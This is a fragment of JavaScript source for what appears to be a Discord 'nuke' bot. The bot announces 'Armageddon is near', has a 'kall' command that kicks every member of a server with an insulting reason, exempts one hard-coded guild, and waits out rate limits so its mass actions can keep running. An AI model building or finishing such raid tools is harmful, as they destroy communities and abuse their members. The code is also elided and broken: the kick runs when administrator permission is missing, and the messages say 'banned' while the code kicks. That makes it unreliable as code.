...
client.on('rateLimit', rate => {
  ...
  sleep(rate.timeDifference);
});

client.on("message", async message => {

    if (message.author.bot) return;
    if (message.guild.id === "796817714785157123") return;

    if (message.mentions.everyone === true) {
        return;
    } else if (message.mentions.has(client.user.id)) {
        if (message.content.startsWith(prefix + 'help')) {
            message.channel.send(`Armageddon is near\n\n**Nuking:**\n
    ...
    if (disableEveryone === false) {
        ...
        if (message.content.startsWith(prefix + 'kall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                ...
                message.guild.members.cache.forEach(member => member.kick({ reason: "Dickhead." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                        .catch()
                    ));
                message.delete();
